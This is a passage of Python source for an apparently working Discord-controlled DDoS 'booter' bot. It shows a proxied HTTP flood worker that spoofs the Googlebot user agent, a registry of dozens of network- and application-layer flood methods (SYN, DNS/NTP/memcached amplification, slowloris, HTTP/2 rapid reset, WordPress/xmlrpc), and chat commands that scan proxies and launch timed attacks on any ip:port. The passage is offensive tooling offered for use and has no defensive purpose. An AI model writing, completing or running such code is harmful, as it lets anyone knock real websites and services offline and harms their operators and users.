                        async with s.get(u, headers={"User-Agent": "Googlebot/2.1"},
                                         proxy=f"http://{proxy}") as r:
                            await r.read()
                    except Exception:
                        pass
        except Exception:
            pass
    await asyncio.gather(*[w(proxies[i % len(proxies)]) for i in range(C.L7_THREADS)])


# ---------- method registry ----------

METHODS = {
    # L4
    "tcp": m_tcp_flood,
    "udp": m_udp_flood,
    "syn": m_syn_flood,
    "ack": m_ack_flood,
    "rst": m_rst_flood,
    "fin": m_fin_flood,
    "xmas": m_xmas_flood,
    "icmp": m_icmp_flood,
    "udpraw": m_udp_raw_flood,
    "dns": m_dns_flood,
    "ntp": m_ntp_flood,
    "ssdp": m_ssdp_flood,
    "memcached": m_memcached_flood,
    "slowloris": m_slowloris,
    # L7
    "get": m_http_get,
    "post": m_http_post,
    "head": m_http_head,
    "options": m_http_options,
    "put": m_http_put,
    "delete": m_http_delete,
    "patch": m_http_patch,
    "trace": m_http_trace,
    "connect": m_http_connect,
    "https": m_https_flood,
    "http2": m_http2_flood,
    "http3": m_http3_flood,
    "slowpost": m_slow_post,
    "rapidreset": m_rapid_reset,
    "cache": m_cache_bypass,
    "randompath": m_random_path,
    "uuid": m_uuid_path,
    "keepalive": m_keepalive,
    "cookie": m_cookie_flood,
    "ua": m_ua_rotate,
    "referer": m_referer_flood,
    "xff": m_xff_flood,
    "range": m_range_flood,
    "multipart": m_multipart_flood,
    "json": m_json_flood,
    "xml": m_xml_flood,
    "graphql": m_graphql_flood,
    "websocket": m_websocket_flood,
    "wordpress": m_wordpress_flood,
    "xmlrpc": m_xmlrpc_flood,
    "api": m_api_flood,
    "login": m_login_flood,
    "search": m_search_flood,
    "upload": m_upload_flood,
    "download": m_download_flood,
    "redirect": m_redirect_flood,
    "bot": m_bot_flood,
    "seo": m_seo_flood,
    # aliases
    "http": m_http_get,
    "l7": m_http_get,
    "l4": m_tcp_flood,
    "tcpflood": m_tcp_flood,
    "udpflood": m_udp_flood,
    "synflood": m_syn_flood,
    "ackflood": m_ack_flood,
    "rstflood": m_rst_flood,
    "finflood": m_fin_flood,
    "xmasflood": m_xmas_flood,
    "icmpflood": m_icmp_flood,
    "dnsflood": m_dns_flood,
    "ntpflood": m_ntp_flood,
    "ssdpflood": m_ssdp_flood,
    "memflood": m_memcached_flood,
    "httpflood": m_http_get,
    "httpsflood": m_https_flood,
    "http2flood": m_http2_flood,
    "http3flood": m_http3_flood,
    "slowlorisflood": m_slowloris,
    "slowpostflood": m_slow_post,
    "rapidresetflood": m_rapid_reset,
    "cacheflood": m_cache_bypass,
    "randompathflood": m_random_path,
    "uuidflood": m_uuid_path,
    "keepaliveflood": m_keepalive,
    "cookeflood": m_cookie_flood,
    "uaflood": m_ua_rotate,
    "refererflood": m_referer_flood,
    "xffflood": m_xff_flood,
    "rangeflood": m_range_flood,
    "multipartflood": m_multipart_flood,
    "jsonflood": m_json_flood,
    "xmlflood": m_xml_flood,
    "graphqlflood": m_graphql_flood,
    "websocketflood": m_websocket_flood,
    "wordpressflood": m_wordpress_flood,
    "xmlrpcflood": m_xmlrpc_flood,
    "apiflood": m_api_flood,
    "loginflood": m_login_flood,
    "searchflood": m_search_flood,
    "uploadflood": m_upload_flood,
    "downloadflood": m_download_flood,
    "redirectflood": m_redirect_flood,
    "botflood": m_bot_flood,
    "seoflood": m_seo_flood,
}

# ---------- discord ----------

@bot.event
async def on_ready():
    global PROXIES
    PROXIES = load_proxies()
    print(f"online {bot.user} | proxies={len(PROXIES)} | methods={len(METHODS)}")


@bot.command(name="scanproxy")
async def scanproxy(ctx):
    msg = await ctx.send("scanning...")
    total, alive = await scan_proxies()
    global PROXIES
    PROXIES = load_proxies()
    await msg.edit(content=f"pool={total} alive={alive}")


@bot.command(name="reload")
async def reload(ctx):
    global PROXIES
    PROXIES = load_proxies()
    await ctx.send(f"reloaded proxies={len(PROXIES)}")


@bot.command(name="methods")
async def methods(ctx):
    names = sorted(METHODS.keys())
    chunks = [names[i:i + 60] for i in range(0, len(names), 60)]
    for c in chunks:
        await ctx.send("```" + " ".join(c) + "```")


@bot.command(name="attack")
async def attack(ctx, arg: str, method: str = None, dur: int = 60):
    # /attack ip:port method [dur]
    if not PROXIES:
        await ctx.send("no proxies. /scanproxy")
        return
    if not method or method.lower() not in METHODS:
        await ctx.send(f"unknown method. /methods ({len(METHODS)} total)")
        return
    if ":" not in arg:
        await ctx.send("usage: /attack ip:port method [dur]")
        return
    host, port_s = arg.rsplit(":", 1)
    try:
        port = int(port_s)
    except ValueError:
        await ctx.send("bad port")
        return
    fn = METHODS[method.lower()]
    job = asyncio.create_task(fn(host, port, dur, PROXIES))
    JOBS[f"{ctx.author.id}-{int(time.time())}"] = job
    await ctx.send(f"{method} -> {host}:{port} {dur}s proxies={len(PROXIES)}")


@bot.command(name="stop")
async def stop(ctx):
    n = 0
    for k, j in list(JOBS.items()):
        if k.startswith(str(ctx.author.id)):
            j.cancel()
            JOBS.pop(k, None)
            n += 1
    await ctx.send(f"stopped {n} jobs")


bot.run(C.TOKEN)